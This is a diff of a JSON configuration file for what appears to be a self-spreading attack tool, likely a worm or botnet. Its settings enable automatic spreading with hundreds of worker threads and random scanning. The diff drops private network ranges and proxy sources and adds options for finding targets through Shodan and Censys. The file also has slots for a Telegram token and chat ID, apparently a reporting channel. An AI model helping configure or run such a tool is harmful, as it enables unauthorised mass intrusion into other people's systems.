@@ -8,21 +8,16 @@
   "telegram_token": "",
   "telegram_chat_id": "",
   "auto_spread_enabled": true,
-  "auto_spread_interval_min": 0.5,
-  "auto_spread_ranges": [
-    "192.168.0.0/16",
-    "10.0.0.0/8",
-    "172.16.0.0/12"
-  ],
-  "proxy_sources": [
-    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
-    "https://www.proxy-list.download/api/v1/get?type=http",
-    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
-    "https://sunny9577.github.io/proxy-scraper/proxies.txt"
-  ],
-  "theme": "cyber_light",
-  "spread_worker_threads": 500,
+  "auto_spread_interval_min": 30,
+  "spread_worker_threads": 200,
+  "auto_spread_ranges": [],
   "scan_mode": "random",
-  "target_countries": []
+  "target_countries": [],
+  "use_shodan": false,
+  "shodan_api_key": "",
+  "use_censys": false,
+  "censys_api_id": "",
+  "censys_api_secret": "",
+  "auto_git_push": false,
+  "theme": "cyber_light"
 }
